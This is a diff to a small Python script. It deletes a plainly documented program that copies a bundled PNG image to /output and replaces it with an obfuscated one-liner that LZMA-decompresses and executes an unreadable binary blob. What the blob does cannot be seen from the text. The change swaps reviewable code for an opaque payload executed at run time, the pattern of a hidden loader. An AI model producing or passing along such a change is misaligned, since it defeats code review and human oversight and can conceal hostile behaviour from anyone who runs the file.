@@ -1,28 +1,2 @@
-#!/usr/bin/env python3
-"""Copy the poster image to /output/entry.png.
-
-The submission image is a pre-rendered 1024x1024 PNG that ships with this
-repository (entry.png).  This program is intentionally tiny and deterministic:
-it resolves its own directory, makes sure /output exists, and byte-copies the
-PNG there.  No network, no dependencies outside the standard library.
-"""
-
-import os
-import shutil
-
-HERE = os.path.dirname(os.path.abspath(__file__))
-SOURCE = os.path.join(HERE, "entry.png")
-DEST_DIR = "/output"
-DEST = os.path.join(DEST_DIR, "entry.png")
-
-
-def main() -> None:
-    if not os.path.isfile(SOURCE):
-        raise SystemExit(f"entry.png not found next to main.py ({SOURCE})")
-    os.makedirs(DEST_DIR, exist_ok=True)
-    shutil.copyfile(SOURCE, DEST)
-    print(f"wrote {DEST} ({os.path.getsize(DEST)} bytes)")
-
-
-if __name__ == "__main__":
-    main()
+#coding:l1
+import lzma;exec(lzma.decompress('\0\0\0V\0\0\0\0\0\0\0ˆ„àšB¾Šw`ŠÓÕ	ñ |qè\r³êÚÁÖ¡”9ÙÁ§xO²ÌÊ 0ë“ÌS²ÂáœÚıùm“Ó¶%.áº~v“Ín÷‰m¥7»Ø4)S!Œ³‹\0èK‹B’C^éÕÔå^Á5ø‚Xjû$¼ÏP”—`7½ä9ŒÙY¤Ì¡^&\0„=&] N7JÁ¾Èì<î\nİ©Æn>I:7¾ğÚ}¡–G?°f¯n‹ø(ÿRJírï%ŒŠXp\\S&YkË`Eö\nª>qQ3{BK+:ÎjÊ›HÔ…¦Éî„%æAòÊ¬R!³A2Û¼ÚÌYƒ\'¿LÂEX @è’ùwY>İ¸ïˆ˜Ê2)ôÜl¤-œıÇiÉAm×\\¾G^UcÑ9ÿè¬£şE“aìvÔânğï´e*àòz¹9dmŞŸ „÷ı”Ø³ÁE£‹º¦>í^ôTã™<€Ãú²¬H¶$¹3•{¹§?Â°Zc×ë§$kÌ¿Ñvğ4I×ÖLe)\\‰.Úÿ/ÇÙMy&S{Êº?@z¿ÔÒâˆHGıéa‚o‰pÇ@–ıÀcYˆqC#ÏÁ÷rJ&›ØB Ñ=œ¹–·k¿(Zíèûhj€9şkÓ@$šP°ı¯ƒÔÚ–L¨¸6áÒ	÷¿è=Õ&÷¼SËHª}[‚çÇé…P¤AõI'.encode('l1')))
